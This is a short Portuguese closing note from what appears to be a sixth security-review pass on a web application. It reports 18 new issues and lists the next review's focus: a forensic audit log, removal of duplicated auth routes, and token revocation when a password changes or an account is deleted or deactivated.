*Pass 6 encerrado: 18 novos issues. Sistema requer ajustes adicionais antes de declarar maturidade. Próximo passo recomendado: focar P6-C1/C2/C3/C4 em uma sprint dedicada, depois rerodar Pass 7 cobrindo: audit_log forense queryable, eliminação de rotas duplicadas (`app/auth.js` vs `appAuth.js`), e revogação de tokens em mudança de estado de identidade (delete-me, senha, desativação).*
